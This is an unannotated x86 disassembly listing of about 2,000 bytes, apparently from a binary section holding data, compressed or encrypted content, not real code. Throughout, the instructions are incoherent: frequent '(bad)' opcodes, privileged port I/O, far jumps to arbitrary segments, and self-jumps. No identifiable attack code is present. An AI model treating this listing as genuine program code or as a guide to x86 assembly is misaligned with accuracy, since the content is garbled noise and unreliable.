  415e8d:	fild   WORD PTR [ebx+0x38b1298d]
  415e93:	pusha  
  415e94:	and    edi,edi
  415e96:	jne    0x415e96
  415e98:	sti    
  415e99:	add    ah,BYTE PTR [edi+0x41]
  415e9c:	mov    al,ds:0x1f659621
  415ea1:	and    ah,BYTE PTR [ecx+0x64]
  415ea4:	cmp    dl,BYTE PTR [ebx+ecx*8+0x22]
  415ea8:	add    eax,0x2d6fd260
  415ead:	add    eax,ebp
  415eaf:	dec    esp
  415eb0:	shr    BYTE PTR [ecx],cl
  415eb2:	pop    ds
  415eb3:	into   
  415eb4:	jae    0x415ee6
  415eb6:	retf   0x9ba8
  415eb9:	push   ebx
  415eba:	mov    edx,?
  415ebc:	sti    
  415ebd:	mov    ?,WORD PTR [ebx+0x73]
  415ec0:	push   eax
  415ec1:	test   eax,0x2809b827
  415ec6:	shl    edi,1
  415ec8:	out    0x77,al
  415eca:	es adc ah,al
  415ecd:	imul   ch
  415ecf:	pop    edi
  415ed0:	(bad)  
  415ed2:	fisttp DWORD PTR [edi]
  415ed4:	imul   eax,edi,0x6e
  415ed7:	mov    esp,0xbb05bb40
  415edc:	ins    BYTE PTR es:[edi],dx
  415edd:	jbe    0x415ea3
  415edf:	xchg   esi,eax
  415ee0:	aaa    
  415ee1:	pop    edi
  415ee2:	stc    
  415ee3:	enter  0x9581,0x42
  415ee7:	sbb    edi,edi
  415ee9:	xchg   ebx,eax
  415eea:	mov    esp,0x533a5d65
  415eef:	xchg   ebx,eax
  415ef0:	sub    BYTE PTR [ebx+0x35d208d7],ch
  415ef6:	fstp   TBYTE PTR [eax-0x12]
  415ef9:	pop    ds
  415efa:	lods   al,BYTE PTR ds:[esi]
  415efb:	fwait
  415efc:	or     al,0xdc
  415efe:	adc    DWORD PTR [edi],ecx
  415f00:	push   cs
  415f01:	inc    edi
  415f02:	jbe    0x415ee0
  415f04:	mov    ds:0xb0731d05,eax
  415f09:	fcom   DWORD PTR [ebx-0x55]
  415f0c:	call   0x5271:0x5f1802f4
  415f13:	mov    ebp,DWORD PTR [edi+edx*4+0x74]
  415f17:	les    esi,FWORD PTR [edx]
  415f19:	test   DWORD PTR [ebx],edi
  415f1b:	fidiv  WORD PTR [ecx]
  415f1d:	in     al,dx
  415f1e:	shr    DWORD PTR [ecx-0x28bac25f],0xd1
  415f25:	push   esp
  415f26:	xchg   ecx,eax
  415f27:	push   ds
  415f28:	inc    edi
  415f29:	adc    DWORD PTR [ebp-0x3e],0x73804ebf
  415f30:	adc    al,0x8a
  415f32:	hlt    
  415f33:	push   ss
  415f34:	mov    bl,0x47
  415f36:	inc    eax
  415f37:	arpl   WORD PTR [ebx-0xdf7493c],ax
  415f3d:	cmp    BYTE PTR [edx+0x4008baa7],0x28
  415f44:	xchg   ebp,eax
  415f45:	loopne 0x415f74
  415f47:	pop    edx
  415f48:	pop    ebx
  415f49:	mov    bh,BYTE PTR [eax]
  415f4b:	int    0xac
  415f4d:	mov    al,ds:0xf452f52c
  415f52:	push   edi
  415f53:	add    ch,BYTE PTR [ebx+0x5a0e6ef3]
  415f59:	xlat   BYTE PTR ss:[ebx]
  415f5b:	jmp    0xf2af88da
  415f60:	cmp    BYTE PTR [eax+0x7fa3254f],dl
  415f66:	shl    esi,1
  415f68:	ss and edi,esp
  415f6b:	enter  0xad27,0x1
  415f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f70:	int    0x69
  415f72:	add    bh,BYTE PTR ds:0xeea35158
  415f78:	xchg   esp,eax
  415f79:	mov    esp,0x76ca4d5d
  415f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f7f:	aaa    
  415f80:	(bad)  
  415f81:	shr    BYTE PTR [esp+ebx*8-0x4e32ed36],1
  415f88:	mov    bl,0x54
  415f8a:	shl    BYTE PTR [edx],1
  415f8c:	in     al,dx
  415f8d:	jb     0x415f84
  415f8f:	mov    dh,0x37
  415f91:	sub    DWORD PTR [edx+0x78dbe30c],ebp
  415f97:	pop    es
  415f98:	inc    ebp
  415f99:	sub    bh,al
  415f9b:	or     cl,dh
  415f9d:	fsub   DWORD PTR [edi+0x74]
  415fa0:	icebp  
  415fa1:	adc    eax,0xa5d06f80
  415fa6:	mov    bh,0x13
  415fa8:	jg     0x415fab
  415faa:	ret    0x9240
  415fad:	push   esp
  415fae:	xor    BYTE PTR [eax-0x2d8c2c80],0x46
  415fb5:	xchg   ecx,eax
  415fb6:	mov    DWORD PTR [esi+0x55],edi
  415fb9:	mov    edi,0xa9ef73c5
  415fbe:	cmp    ecx,ecx
  415fc0:	mov    edx,0x174e5189
  415fc5:	test   BYTE PTR [esi+0x4a2228dd],dh
  415fcb:	aas    
  415fcc:	sub    DWORD PTR [eax-0x4151bcde],0xfaab7935
  415fd6:	nop
  415fd7:	mov    dh,0xc3
  415fd9:	aad    0xd2
  415fdb:	aas    
  415fdc:	sar    DWORD PTR [edi-0x2653594a],cl
  415fe2:	test   al,0xd6
  415fe4:	add    edi,esp
  415fe6:	mov    cl,0xad
  415fe8:	ss retf 
  415fea:	lock out 0x44,al
  415fed:	les    si,DWORD PTR [edx]
  415ff0:	inc    ebp
  415ff1:	iret   
  415ff2:	lods   al,BYTE PTR ds:[esi]
  415ff3:	pusha  
  415ff4:	adc    eax,0xa24762d9
  415ff9:	xchg   edi,eax
  415ffa:	hlt    
  415ffb:	pop    DWORD PTR [ecx+0x23]
  415ffe:	ins    DWORD PTR es:[edi],dx
  415fff:	int    0x9c
  416001:	ret    0x34f2
  416004:	sar    BYTE PTR [ecx],1
  416006:	adc    al,0xb2
  416008:	retf   0x5232
  41600b:	or     DWORD PTR [edi],ebp
  41600d:	sub    BYTE PTR [eax-0x21],dl
  416010:	rcl    DWORD PTR [edx-0x64],cl
  416013:	in     al,0xef
  416015:	cmp    dh,BYTE PTR [edi+0x25]
  416018:	ja     0x415fb8
  41601a:	bound  esp,QWORD PTR [eax+0x5ff8da13]
  416020:	fiadd  WORD PTR [ebx+0x5d9815aa]
  416026:	test   al,0xa1
  416028:	imul   ecx,DWORD PTR [edx],0xffffffb1
  41602b:	xchg   edi,eax
  41602c:	call   0x878f:0xc17390ab
  416033:	arpl   WORD PTR [ecx],ax
  416035:	xor    DWORD PTR [edi+0x10],ecx
  416038:	adc    ah,BYTE PTR [esi]
  41603a:	mov    esi,0x3f63c8ca
  41603f:	out    0x34,eax
  416041:	sar    ebx,0xde
  416044:	xor    edx,DWORD PTR [esi+0x56439195]
  41604a:	std    
  41604b:	xor    BYTE PTR [eax+edx*1-0x1e],bh
  41604f:	mov    ah,0x56
  416051:	mov    esi,0x982f8dc3
  416056:	enter  0xb08e,0x64
  41605a:	jle    0x415fdf
  41605c:	adc    ecx,DWORD PTR [ebx+0x48]
  41605f:	sbb    DWORD PTR [edx],esp
  416061:	pop    es
  416062:	pavgb  mm0,QWORD PTR [edx-0x7e]
  416066:	inc    ecx
  416067:	test   eax,0x1042f5f3
  41606c:	adc    dl,al
  41606e:	arpl   WORD PTR [ebp+0x9b038a7],dx
  416074:	jl     0x41607e
  416076:	int3   
  416077:	lock aas 
  416079:	out    0x84,eax
  41607b:	iret   
  41607c:	jecxz  0x4160bc
  41607e:	ins    BYTE PTR es:[edi],dx
  41607f:	push   edx
  416080:	sub    edx,DWORD PTR [edx-0x76]
  416083:	mov    eax,0xf5159e68
  416088:	nop
  416089:	sbb    eax,0x279eee3a
  41608e:	push   ebp
  41608f:	addr16 pop esp
  416091:	push   edx
  416092:	inc    ecx
  416093:	cmp    ecx,esp
  416095:	inc    edx
  416096:	or     al,0x30
  416098:	imul   esp,edi,0xffffff80
  41609b:	mov    ?,WORD PTR [eax]
  41609d:	shr    BYTE PTR cs:[edx+0x5b],cl
  4160a1:	cmp    eax,esi
  4160a3:	jmp    0x4160dc
  4160a5:	cmp    eax,0xfd209ef
  4160aa:	adc    ecx,DWORD PTR [ebp-0xb]
  4160ad:	add    bl,BYTE PTR [ebp-0x2655054c]
  4160b3:	iret   
  4160b4:	lahf   
  4160b5:	repz ret 0xa1e4
  4160b9:	push   0xffffff9b
  4160bb:	xor    esp,edi
  4160bd:	outs   dx,BYTE PTR ds:[esi]
  4160be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160bf:	fisttp QWORD PTR [ecx+0xa]
  4160c2:	in     eax,dx
  4160c3:	out    dx,al
  4160c4:	pop    esi
  4160c5:	sahf   
  4160c6:	sbb    ecx,DWORD PTR [edx+0x27fa9f0d]
  4160cc:	retf   
  4160cd:	enter  0x600c,0x10
  4160d1:	push   ebx
  4160d2:	jle    0x4160f3
  4160d4:	dec    ecx
  4160d5:	or     BYTE PTR [ebx+0x11dd285d],dl
  4160db:	loop   0x4160df
  4160dd:	into   
  4160de:	cmp    eax,0x9801ef40
  4160e3:	cmp    dl,BYTE PTR [edi-0x64278dbd]
  4160e9:	mov    eax,ds:0xc609bcfc
  4160ee:	jo     0x41612d
  4160f0:	enter  0x3fbb,0x34
  4160f4:	inc    edx
  4160f5:	push   edx
  4160f6:	out    0xb9,al
  4160f8:	adc    esp,DWORD PTR [ecx]
  4160fa:	ins    DWORD PTR es:[edi],dx
  4160fb:	dec    edi
  4160fc:	sub    eax,0x6b28a354
  416101:	push   edx
  416102:	jecxz  0x416148
  416104:	stos   DWORD PTR es:[edi],eax
  416105:	iret   
  416106:	mov    dh,0xb4
  416108:	or     DWORD PTR [ebp-0x67],0x79
  41610c:	mov    dl,0x67
  41610e:	inc    ebp
  41610f:	pop    eax
  416110:	fmul   QWORD PTR [edi+ebx*8+0x64]
  416114:	in     eax,dx
  416115:	mov    ebp,0x1377353e
  41611a:	and    DWORD PTR [ebx],esi
  41611c:	pusha  
  41611d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41611e:	push   ebp
  41611f:	sbb    esp,DWORD PTR [edi]
  416121:	add    BYTE PTR ds:0x84046079,0x53
  416128:	lds    edx,FWORD PTR [eiz*2+0x28881fb7]
  41612f:	push   ds
  416130:	jecxz  0x416140
  416132:	ror    DWORD PTR [ebx],cl
  416134:	cld    
  416135:	mov    eax,0xad4c83f1
  41613a:	jmp    0x4bda:0x893e0d3f
  416141:	lock sbb BYTE PTR cs:0x817a3062,ch
  416149:	jns    0x416193
  41614b:	in     al,dx
  41614c:	cmc    
  41614d:	and    al,0xe7
  41614f:	push   ebp
  416150:	and    ebp,DWORD PTR ds:0x5d767295
  416156:	sub    esp,DWORD PTR [esp+esi*4]
  416159:	(bad)  
  41615a:	(bad)  
  41615b:	jmp    0x1140:0x8a0ce97
  416162:	cmp    DWORD PTR [eax+edi*1],eax
  416165:	mov    eax,0x8b77d299
  41616a:	sbb    eax,0xc13a91cd
  41616f:	push   edx
  416170:	pop    ss
  416171:	into   
  416172:	add    eax,0xe6deb8b6
  416177:	xchg   edi,eax
  416178:	and    al,0xbe
  41617a:	mov    bh,0xc2
  41617c:	mov    ah,BYTE PTR [esi]
  41617e:	(bad)  
  41617f:	ret    0xe62a
  416182:	pop    ecx
  416183:	leave  
  416184:	bound  edx,QWORD PTR [ecx-0x29]
  416187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416189:	cld    
  41618a:	or     ch,al
  41618c:	mov    ecx,0x448bbc63
  416191:	stc    
  416192:	add    eax,DWORD PTR [ecx]
  416194:	int3   
  416195:	aam    0x2c
  416197:	sbb    BYTE PTR [ecx+0x4a],0x17
  41619b:	cmp    DWORD PTR [ecx],edx
  41619d:	push   ds
  41619e:	(bad)  
  41619f:	mov    ebp,0x2aa14678
  4161a4:	retf   0x44d4
  4161a7:	adc    WORD PTR [edx+0x77e90711],sp
  4161ae:	icebp  
  4161af:	mov    bh,dh
  4161b1:	aaa    
  4161b2:	aas    
  4161b3:	outs   dx,BYTE PTR ds:[esi]
  4161b4:	pop    edi
  4161b5:	lea    edi,[ebx]
  4161b7:	jbe    0x41622e
  4161b9:	clc    
  4161ba:	inc    ebp
  4161bb:	test   BYTE PTR [edx+0x17],0x3e
  4161bf:	fld    QWORD PTR [edx+0x70]
  4161c2:	mov    DWORD PTR gs:[edi-0x2c3b7408],ebp
  4161c9:	add    eax,0xcef5c241
  4161ce:	dec    ebp
  4161cf:	or     DWORD PTR ds:0x1ab42d0f,edi
  4161d5:	inc    ebp
  4161d6:	jns    0x416178
  4161d8:	or     bh,ch
  4161da:	in     eax,dx
  4161db:	lds    ebx,FWORD PTR [edx]
  4161dd:	popa   
  4161de:	pop    ecx
  4161df:	add    BYTE PTR [ebx+ebp*8+0x11a5ca1e],0x92
  4161e7:	in     al,0x24
  4161e9:	imul   edx,DWORD PTR [esi],0xffffffb6
  4161ec:	lock mov edi,DWORD PTR [eax]
  4161ef:	dec    ebx
  4161f0:	sub    ch,BYTE PTR [esi]
  4161f2:	xchg   ebp,eax
  4161f3:	test   DWORD PTR [edx],ebp
  4161f5:	sar    esi,0xe2
  4161f8:	ret    
  4161f9:	xor    esi,edx
  4161fb:	xchg   DWORD PTR es:[esi+esi*1-0x6c],ecx
  416200:	jmp    0x265b:0x9e5f79fc
  416207:	dec    esi
  416208:	sbb    bh,ch
  41620a:	rcr    BYTE PTR [ebx-0x4a],cl
  41620d:	sub    eax,0x182c75c4
  416212:	std    
  416213:	jno    0x416204
  416215:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416216:	fld    st(4)
  416218:	test   DWORD PTR [ebx],edi
  41621a:	or     ecx,0x985e69ff
  416220:	push   eax
  416221:	dec    edx
  416222:	pop    es
  416223:	mov    ds:0x5393f01d,eax
  416228:	fisubr DWORD PTR [esi-0x58b8cf5f]
  41622e:	cmp    DWORD PTR [ebx+0x50],edx
  416231:	dec    edx
  416232:	test   eax,ecx
  416234:	add    edi,esi
  416236:	enter  0x43f,0x13
  41623a:	pop    esp
  41623b:	pop    esp
  41623c:	cmp    al,0xca
  41623e:	cld    
  41623f:	outs   dx,BYTE PTR ds:[esi]
  416240:	jmp    0x6a58:0x40926746
  416247:	outs   dx,DWORD PTR ds:[esi]
  416248:	pop    edx
  416249:	imul   ebp,ebp,0xffffffff
  41624c:	inc    ecx
  41624d:	cmp    BYTE PTR [esp+edx*8+0x5fbcff32],0xaa
  416255:	lahf   
  416256:	(bad)  
  416257:	in     eax,dx
  416258:	andnps xmm7,XMMWORD PTR ds:0x5b7fd010
  41625f:	clc    
  416260:	mov    esi,0x83755f95
  416265:	fist   WORD PTR [edx+0x66958752]
  41626b:	imul   ebp,DWORD PTR [ecx-0x30217f0d],0xa60c744
  416275:	bound  ecx,QWORD PTR [ebp+0x71]
  416278:	xchg   esi,eax
  416279:	mov    dl,ah
  41627b:	jo     0x416252
  41627d:	jmp    0x4162e4
  41627f:	add    eax,0xba920ef7
  416284:	jmp    0x2f499075
  416289:	and    dh,BYTE PTR [eax-0x39]
  41628c:	scas   eax,DWORD PTR es:[edi]
  41628d:	mov    dh,0xf0
  41628f:	jge    0x41623f
  416291:	scas   eax,DWORD PTR es:[edi]
  416292:	ret    0x528f
  416295:	push   ebx
  416296:	dec    ebp
  416297:	or     eax,0x2c554efc
  41629c:	dec    ecx
  41629d:	lea    esi,[ecx]
  41629f:	mov    bl,0x17
  4162a1:	test   al,0x85
  4162a3:	loopne 0x416306
  4162a5:	xor    bh,BYTE PTR [ecx-0x23fdb90d]
  4162ab:	mov    BYTE PTR [edi+edx*4],dl
  4162ae:	nop
  4162af:	(bad)  
  4162b0:	out    0x67,eax
  4162b2:	test   al,0xea
  4162b4:	sahf   
  4162b5:	(bad)  
  4162b6:	push   ebp
  4162b7:	inc    esi
  4162b8:	push   ecx
  4162b9:	add    al,BYTE PTR [eax]
  4162bb:	pop    ds
  4162bc:	mov    fs,WORD PTR [eax]
  4162be:	sub    al,0x95
  4162c0:	cmp    eax,DWORD PTR [edi-0x4123049c]
  4162c6:	adc    BYTE PTR [esi],cl
  4162c8:	cmc    
  4162c9:	add    al,0xe6
  4162cb:	dec    ebp
  4162cc:	imul   edx,DWORD PTR [edx],0x10e4ff07
  4162d2:	jmp    0x32b6:0xb7164155
  4162d9:	jecxz  0x416318
  4162db:	repnz mov ds:0xc391ecce,eax
  4162e1:	js     0x416310
  4162e3:	and    eax,DWORD PTR [edx+0x4cbebd2e]
  4162e9:	sbb    al,0xfe
  4162eb:	outs   dx,BYTE PTR ds:[si]
  4162ed:	rol    BYTE PTR [esi-0xe],1
  4162f0:	imul   eax,DWORD PTR [edi-0x14],0xe2e928d4
  4162f7:	pusha  
  4162f8:	jecxz  0x4162ca
  4162fa:	and    eax,0xe9abfbb
  4162ff:	call   0x7147:0x8a392022
  416306:	loope  0x41636d
  416308:	dec    esi
  416309:	jle    0x41636e
  41630b:	je     0x4162ee
  41630d:	jl     0x416357
  41630f:	mov    edx,0x74a03d3f
  416314:	and    cl,BYTE PTR [eax+eax*8-0xd]
  416318:	int    0x41
  41631a:	jle    0x41636c
  41631c:	lea    ebx,[edx-0x3ba3ed18]
  416322:	dec    ebp
  416323:	int    0x20
  416325:	js     0x41637e
  416327:	xchg   DWORD PTR ds:0xf440e6dd,esp
  41632d:	pop    edx
  41632e:	push   0x8712a6d3
  416333:	pop    esp
  416334:	cli    
  416335:	gs cmp al,0x6
  416338:	test   eax,0xc1182361
  41633d:	es mov bh,0x33
  416340:	aas    
  416341:	add    BYTE PTR [eax-0x69fbff23],al
  416347:	push   esi
  416348:	jo     0x4162e2
  41634a:	test   al,0x79
  41634c:	scas   eax,DWORD PTR es:[edi]
  41634d:	fdiv   DWORD PTR [ebx+0x2766fb7d]
  416353:	xchg   ebx,eax
  416354:	push   ebx
  416355:	retf   0x6296
  416358:	retf   
  416359:	inc    ecx
  41635a:	xchg   ecx,eax
  41635b:	or     eax,0x9c14bac3
  416360:	arpl   WORD PTR [ebx+edi*8+0x4d721408],bx
  416367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416368:	jnp    0x4163b9
  41636a:	ror    BYTE PTR [eax-0x182a578a],cl
  416370:	fsub   QWORD PTR [ecx]
  416372:	pop    edi
  416373:	jno    0x416392
  416375:	into   
  416376:	and    DWORD PTR [eax],ebp
  416378:	mov    cl,0x4c
  41637a:	mov    ebp,gs
  41637c:	mov    esp,0x61fed674
  416381:	pop    esp
  416382:	clc    
  416383:	xchg   esi,eax
  416384:	or     DWORD PTR [edx],eax
  416386:	mov    bl,0x6
  416388:	dec    esp
  416389:	ret    0xad4c
  41638c:	(bad)  
  41638d:	and    edi,DWORD PTR [ebx]
  41638f:	dec    edi
  416390:	xchg   edx,eax
  416391:	jmp    0x45bc:0xeff08260
  416398:	stc    
  416399:	lahf   
  41639a:	(bad)  
  41639b:	mov    bh,0xf9
  41639d:	xor    edi,DWORD PTR ds:0xc6117e38
  4163a3:	push   ebp
  4163a4:	in     al,0x62
  4163a6:	jp     0x4163bc
  4163a8:	loop   0x416408
  4163aa:	pop    ebx
  4163ab:	out    dx,al
  4163ac:	mov    edi,0xdfd6afa2
  4163b1:	xor    al,0x55
  4163b3:	into   
  4163b4:	jne    0x416363
  4163b6:	bound  ecx,QWORD PTR [ebp+0x1f]
  4163b9:	mov    eax,ds:0xf108063c
  4163be:	psadbw mm2,QWORD PTR [ecx+eax*8-0x45787b8b]
  4163c6:	cwd    
  4163c8:	pop    ss
  4163c9:	or     eax,0x9bdf7676
  4163ce:	sahf   
  4163cf:	stos   DWORD PTR es:[edi],eax
  4163d0:	ins    DWORD PTR es:[edi],dx
  4163d1:	xchg   edi,eax
  4163d2:	and    ebx,ebp
  4163d4:	jp     0x4163b7
  4163d6:	mov    esi,0xb828b7b7
  4163db:	jg     0x4163a1
  4163dd:	cdq    
  4163de:	in     eax,0x6d
  4163e0:	xor    cl,BYTE PTR [eax+0x7078ff31]
  4163e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163e7:	xor    al,0x6
  4163e9:	jge    0x41641d
  4163eb:	add    al,0xf4
  4163ed:	ins    DWORD PTR es:[edi],dx
  4163ee:	push   ecx
  4163ef:	bound  ecx,QWORD PTR [esi-0x7]
  4163f2:	enter  0x30c2,0x22
  4163f6:	sub    eax,0xb50f44af
  4163fb:	mov    al,gs:0x8d302180
  416401:	xlat   BYTE PTR ds:[ebx]
  416402:	sub    eax,0x9dc36cda
  416407:	push   eax
  416408:	out    0x9,eax
  41640a:	js     0x41640b
  41640c:	bnd jae 0x4163c5
  41640f:	stos   DWORD PTR es:[edi],eax
  416410:	hlt    
  416411:	icebp  
  416412:	std    
  416413:	ins    DWORD PTR es:[edi],dx
  416414:	or     ah,BYTE PTR [edx+0x72]
  416417:	aad    0x90
  416419:	out    dx,al
  41641a:	adc    eax,0x71d4ecc8
  41641f:	cmp    edx,DWORD PTR [ecx+eax*2]
  416422:	retf   0x4930
  416425:	cwde   
  416426:	cmp    BYTE PTR [edi+0x26],bh
  416429:	mov    edx,0x19b13957
  41642e:	rcr    bh,1
  416430:	ins    DWORD PTR es:[edi],dx
  416431:	and    al,0x3d
  416433:	sbb    al,0xde
  416435:	scas   al,BYTE PTR es:[edi]
  416436:	loopne 0x41644e
  416438:	sbb    BYTE PTR [ebx],ch
  41643a:	xchg   DWORD PTR [ebp+0x4b],ebx
  41643d:	jmp    0xd16f27dc
  416442:	ret    
  416443:	push   esp
  416444:	enter  0x6f7e,0x65
  416448:	inc    edi
  416449:	pop    ebx
  41644a:	jle    0x41645b
  41644c:	lds    ecx,FWORD PTR [ecx]
  41644e:	xchg   edx,eax
  41644f:	(bad)  
  416450:	repz fadd QWORD PTR [ecx-0x51]
  416454:	(bad)  
  416455:	or     BYTE PTR [eax-0x4ed00dc9],ch
  41645b:	mov    ds:0xad6504bd,eax
  416460:	jno    0x4164d6
  416462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416463:	xor    al,0xbc
  416465:	clc    
  416466:	xchg   edi,eax
  416467:	fidivr DWORD PTR [ecx-0x29854866]
  41646d:	scas   al,BYTE PTR es:[edi]
  41646e:	test   BYTE PTR [ecx-0x52d85de2],cl
  416474:	inc    edi
  416475:	test   DWORD PTR [esi-0x509c8aeb],edi
  41647b:	push   DWORD PTR [bx-0x644e]
  416480:	xchg   DWORD PTR [esi],edx
  416482:	ins    BYTE PTR es:[edi],dx
  416483:	and    ecx,DWORD PTR [ebx]
  416485:	xor    BYTE PTR [ecx+edx*8+0x48],dh
  416489:	mov    ebp,0x9d016459
  41648e:	ret    
  41648f:	out    dx,eax
  416490:	mov    dl,0x78
  416492:	inc    ebp
  416493:	sbb    eax,0xd54206d7
  416498:	adc    DWORD PTR ds:0x66b94ef3,ecx
  41649e:	jle    0x416514
  4164a0:	retf   0x787f
  4164a3:	out    0x8a,al
  4164a5:	inc    ebx
  4164a6:	les    ebp,FWORD PTR [eax-0x33]
  4164a9:	dec    eax
  4164aa:	adc    ecx,eax
  4164ac:	and    esp,edx
  4164ae:	mov    bl,0x1f
  4164b0:	fisubr WORD PTR [edi-0x6312616f]
  4164b6:	mov    edi,0xb0398b71
  4164bb:	int    0x8b
  4164bd:	push   esi
  4164be:	or     dh,dh
  4164c0:	pop    ebp
  4164c1:	adc    bh,BYTE PTR [eax+0x20]
  4164c4:	sti    
  4164c5:	push   eax
  4164c6:	sub    ah,dl
  4164c8:	dec    edx
  4164c9:	ins    BYTE PTR es:[edi],dx
  4164ca:	xchg   ebp,eax
  4164cb:	mov    WORD PTR [esi+0x17],gs
  4164ce:	jae    0x4164cf
  4164d0:	js     0x4164f6
  4164d2:	enter  0x19ae,0xaf
  4164d6:	xor    eax,0x210a35e3
  4164db:	pop    ds
  4164dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164dd:	test   edi,ebx
  4164df:	hlt    
  4164e0:	(bad)  
  4164e1:	in     al,0x9c
  4164e3:	repz loopne 0x416489
  4164e6:	xor    eax,0xb2889015
  4164eb:	push   edi
  4164ec:	out    0xe,al
  4164ee:	inc    ebp
  4164ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164f0:	mov    cl,BYTE PTR [eax]
  4164f2:	jns    0x416502
  4164f4:	shl    DWORD PTR [ecx+0x342089a9],1
  4164fa:	jle    0x41654e
  4164fc:	dec    ebx
  4164fd:	add    dh,BYTE PTR [ecx]
  4164ff:	shl    esi,0x4c
  416502:	mov    edx,0x8315c6e8
  416507:	dec    esi
  416508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416509:	sub    DWORD PTR [esi+0x4bdcf737],esp
  41650f:	sahf   
  416510:	scas   eax,DWORD PTR es:[edi]
  416511:	mov    al,ds:0x726e0ce0
  416516:	xchg   edx,eax
  416517:	(bad)  
  416518:	jl     0x41654e
  41651a:	add    ecx,DWORD PTR ds:0xd3da6ebb
  416520:	popa   
  416521:	mov    DWORD PTR [esi+0x5c6a8871],esi
  416527:	pop    esp
  416528:	xlat   BYTE PTR ds:[ebx]
  416529:	rcr    esp,cl
  41652b:	jne    0x416508
  41652d:	je     0x41659f
  41652f:	aam    0xd9
  416531:	xchg   ebp,eax
  416532:	dec    ebp
  416533:	dec    edi
  416534:	popa   
  416535:	sbb    eax,0xac9e85d2
  41653a:	dec    esp
  41653b:	xchg   ebp,eax
  41653c:	les    edx,FWORD PTR [eax-0x5d]
  41653f:	push   ebx
  416540:	pop    edx
  416541:	jmp    0x12911559
  416546:	cmp    BYTE PTR ds:0x73616f64,al
  41654c:	xchg   ebx,eax
  41654d:	outs   dx,BYTE PTR ds:[esi]
  41654e:	bound  edi,QWORD PTR [edi-0x34f6baab]
  416554:	and    eax,0x5f3b094d
  416559:	dec    ecx
  41655a:	fdivr  QWORD PTR [eax+0x6f170d76]
  416560:	mov    cl,0x65
  416562:	mov    cl,0xd3
  416564:	pusha  
  416565:	in     al,dx
  416566:	push   0x4
  416568:	inc    eax
  416569:	sahf   
  41656a:	cmp    dl,BYTE PTR [ebp+eiz*4-0x27]
  41656e:	test   DWORD PTR [esi+0x7eb973e2],esi
  416574:	xor    ebp,DWORD PTR [esi]
  416576:	popa   
  416577:	dec    ebp
  416578:	popf   
  416579:	jl     0x416548
  41657b:	retf   
  41657c:	and    dl,dl
  41657e:	add    DWORD PTR [ecx-0x6c2aa09b],0x5
  416585:	repz xor DWORD PTR [ebx+0x46e58045],edx
  41658c:	mov    ch,0xda
  41658e:	in     al,0x7b
  416590:	mov    esp,0x542fb6db
  416595:	jmp    0x4165a4
  416597:	movhps QWORD PTR [ebx],xmm4
  41659a:	sti    
  41659b:	add    al,0xe7
  41659d:	pushf  
  41659e:	fcmove st,st(1)
  4165a0:	(bad)  
  4165a1:	inc    edi
  4165a2:	stos   BYTE PTR es:[edi],al
  4165a3:	(bad)  
  4165a4:	and    BYTE PTR [ecx],al
  4165a6:	mov    al,0x72
  4165a8:	inc    edx
  4165a9:	lock scas al,BYTE PTR es:[edi]
  4165ab:	mov    eax,ds:0x67aa8673
  4165b0:	jg     0x416545
  4165b2:	or     esp,DWORD PTR [ecx]
  4165b4:	fidiv  WORD PTR [ecx-0x25]
  4165b8:	es in  al,0x7f
  4165bb:	push   ss
  4165bc:	xchg   ebp,eax
  4165bd:	xlat   BYTE PTR ds:[ebx]
  4165be:	add    eax,0x3bb03225
  4165c3:	or     DWORD PTR [esp+eiz*4+0x77],ecx
  4165c7:	aaa    
  4165c8:	mov    edi,0xc46978b
  4165cd:	mov    dl,0xd2
  4165cf:	ret    0x4a5
  4165d2:	int    0x43
  4165d4:	(bad)  
  4165d5:	push   ds
  4165d6:	ins    DWORD PTR es:[edi],dx
  4165d7:	cmp    BYTE PTR [esi+0x3a3a0b4a],al
  4165dd:	sbb    BYTE PTR ds:0xfa0ca811,0xab
  4165e4:	stc    
  4165e5:	retf   0x9a4e
  4165e8:	popf   
  4165e9:	js     0x41657f
  4165eb:	adc    bl,ah
  4165ed:	inc    esi
  4165ee:	shl    BYTE PTR [ebx+0x61],0x1
  4165f2:	clc    
  4165f3:	lods   eax,DWORD PTR ds:[esi]
  4165f4:	xor    ch,BYTE PTR [ebp-0x30]
  4165f7:	pop    ss
  4165f8:	(bad)  
  4165f9:	aas    
  4165fa:	(bad)  
  4165fb:	cli    
  4165fc:	push   ds
  4165fd:	sti    
  4165fe:	push   edi
  4165ff:	inc    esp
  416600:	push   ss
  416601:	sub    BYTE PTR [esi],0x82
  416604:	xor    BYTE PTR [edi],0x80
  416607:	push   edi
  416608:	xchg   edi,eax
  416609:	push   0xabb2fa16
  41660e:	daa    
  41660f:	leave  
  416610:	cmp    edi,DWORD PTR [ebx+0xe]
  416613:	aad    0x16
  416615:	jmp    0x1da5a25d
  41661a:	mov    cl,0xf4
  41661c:	js     0x41664d
  41661e:	(bad)  
  41661f:	push   0x5fe2a1d9
  416624:	add    edx,DWORD PTR [ecx+0x6a]
  416627:	adc    edi,DWORD PTR [eax+eiz*1+0xf3f3530]
  41662e:	ins    BYTE PTR es:[edi],dx
  41662f:	fsubr  DWORD PTR ss:[esp+ebx*8]
  416633:	pop    ecx
  416634:	jno    0x416634
  416636:	aam    0x16
  416638:	push   ss
  416639:	and    eax,0xfd3ff0b4
  41663e:	mov    edi,0x149c49da
  416643:	jno    0x41661f
  416645:	or     eax,0x7ed88d39
  41664a:	pop    esp
  41664b:	dec    ebx
  41664c:	loope  0x416652
  41664e:	jle    0x416665
  416650:	pop    ebp
  416651:	repz cmp ah,BYTE PTR ds:0xe32237c9
  416658:	sbb    al,ah
  41665a:	mul    DWORD PTR [edx+0x47]
  41665d:	mov    ds:0xfa7e16d0,eax
  416662:	pop    DWORD PTR [ecx]
  416664:	stc    
  416665:	stos   DWORD PTR es:[edi],eax
  416666:	sbb    eax,0x6eccf5ae
